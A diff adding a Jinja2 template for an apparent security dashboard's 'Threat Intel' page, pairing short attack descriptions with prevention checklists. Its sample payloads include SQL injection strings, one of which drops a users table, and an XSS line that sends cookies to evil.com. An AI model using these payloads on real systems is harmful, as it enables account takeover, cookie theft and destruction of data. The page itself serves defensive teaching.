@@ -1,0 +1,65 @@
+{% extends "base.html" %}
+{% block title %}Threat Intel — SecureShield{% endblock %}
+{% block page_title %}Threat Intelligence{% endblock %}
+{% block content %}
+<style>.grid-2 { display:grid; grid-template-columns:1fr 1fr; gap:18px; }</style>
+<div class="grid-2">
+  <div class="panel">
+    <div class="panel-header"><div><div class="panel-title">Attack Definitions</div><div class="panel-sub">EHPT Reference Guide</div></div></div>
+    <div style="display:flex;flex-direction:column;gap:14px">
+
+      <div style="background:var(--bg3);border-radius:10px;padding:16px;border-left:3px solid var(--red)">
+        <div style="font-size:13px;font-weight:700;color:var(--red);margin-bottom:8px">💉 SQL Injection</div>
+        <div style="font-size:12px;color:var(--muted);line-height:1.7">Attacker inserts malicious SQL into input fields to manipulate database queries. Can bypass authentication, extract all data, or destroy records.</div>
+        <div style="margin-top:10px;font-size:11px;font-family:'JetBrains Mono',monospace;background:rgba(255,75,110,0.08);padding:8px;border-radius:6px;color:var(--red)">Payload: ' OR '1'='1 / admin'-- / '; DROP TABLE users;--</div>
+      </div>
+
+      <div style="background:var(--bg3);border-radius:10px;padding:16px;border-left:3px solid var(--purple)">
+        <div style="font-size:13px;font-weight:700;color:var(--purple);margin-bottom:8px">📜 Cross-Site Scripting (XSS)</div>
+        <div style="font-size:12px;color:var(--muted);line-height:1.7">Malicious scripts injected into web pages execute in other users' browsers. Enables session hijacking, cookie theft, and credential stealing.</div>
+        <div style="margin-top:10px;font-size:11px;font-family:'JetBrains Mono',monospace;background:rgba(192,75,255,0.08);padding:8px;border-radius:6px;color:var(--purple)">&lt;script&gt;document.location='evil.com?c='+document.cookie&lt;/script&gt;</div>
+      </div>
+
+      <div style="background:var(--bg3);border-radius:10px;padding:16px;border-left:3px solid var(--orange)">
+        <div style="font-size:13px;font-weight:700;color:var(--orange);margin-bottom:8px">🔑 Brute Force Attack</div>
+        <div style="font-size:12px;color:var(--muted);line-height:1.7">Automated tool tries thousands of username/password combinations. Exploits lack of rate limiting, CAPTCHA, or account lockout policies.</div>
+        <div style="margin-top:10px;font-size:11px;font-family:'JetBrains Mono',monospace;background:rgba(255,138,75,0.08);padding:8px;border-radius:6px;color:var(--orange)">Tool: Hydra / Burp Intruder — 1000 requests/min with no lockout</div>
+      </div>
+
+      <div style="background:var(--bg3);border-radius:10px;padding:16px;border-left:3px solid var(--yellow)">
+        <div style="font-size:13px;font-weight:700;color:var(--yellow);margin-bottom:8px">🖊️ HTML Injection</div>
+        <div style="font-size:12px;color:var(--muted);line-height:1.7">Attacker injects raw HTML tags into input fields. Can deface pages, create fake login forms, redirect users, or display misleading content.</div>
+        <div style="margin-top:10px;font-size:11px;font-family:'JetBrains Mono',monospace;background:rgba(255,208,75,0.08);padding:8px;border-radius:6px;color:var(--yellow)">Payload: &lt;h1&gt;Hacked&lt;/h1&gt; / &lt;marquee&gt;Injected&lt;/marquee&gt; / &lt;b&gt;Bold&lt;/b&gt;</div>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-header"><div><div class="panel-title">Prevention Methods</div></div></div>
+    <div style="display:flex;flex-direction:column;gap:14px">
+
+      <div style="background:var(--bg3);border-radius:10px;padding:16px">
+        <div style="font-size:13px;font-weight:700;color:var(--green);margin-bottom:8px">✓ SQL Injection Prevention</div>
+        <div style="font-size:12px;color:var(--muted);line-height:1.9">• Use parameterized queries / prepared statements<br>• Input validation and whitelist filtering<br>• Principle of least privilege on DB accounts<br>• WAF rules to block SQL metacharacters<br>• Use ORM (SQLAlchemy / Django ORM)</div>
+      </div>
+
+      <div style="background:var(--bg3);border-radius:10px;padding:16px">
+        <div style="font-size:13px;font-weight:700;color:var(--green);margin-bottom:8px">✓ XSS Prevention</div>
+        <div style="font-size:12px;color:var(--muted);line-height:1.9">• HTML encode all user-supplied output<br>• Content Security Policy (CSP) headers<br>• HttpOnly and Secure cookie flags<br>• Use Jinja2 auto-escaping (Flask default)<br>• DOMPurify for client-side sanitization</div>
+      </div>
+
+      <div style="background:var(--bg3);border-radius:10px;padding:16px">
+        <div style="font-size:13px;font-weight:700;color:var(--green);margin-bottom:8px">✓ Brute Force Prevention</div>
+        <div style="font-size:12px;color:var(--muted);line-height:1.9">• Rate limiting: max 5 attempts per 15 minutes<br>• CAPTCHA after 3 failed attempts<br>• Account lockout with exponential backoff<br>• Multi-Factor Authentication (MFA/OTP)<br>• Login anomaly alerting</div>
+      </div>
+
+      <div style="background:var(--bg3);border-radius:10px;padding:16px">
+        <div style="font-size:13px;font-weight:700;color:var(--green);margin-bottom:8px">✓ HTML Injection Prevention</div>
+        <div style="font-size:12px;color:var(--muted);line-height:1.9">• Escape all HTML special characters on output<br>• Use Jinja2 auto-escaping (avoid |safe filter)<br>• Strip HTML tags using bleach library<br>• Validate and sanitize all user inputs<br>• Implement Content Security Policy headers</div>
+      </div>
+
+    </div>
+  </div>
+</div>
+{% endblock %}
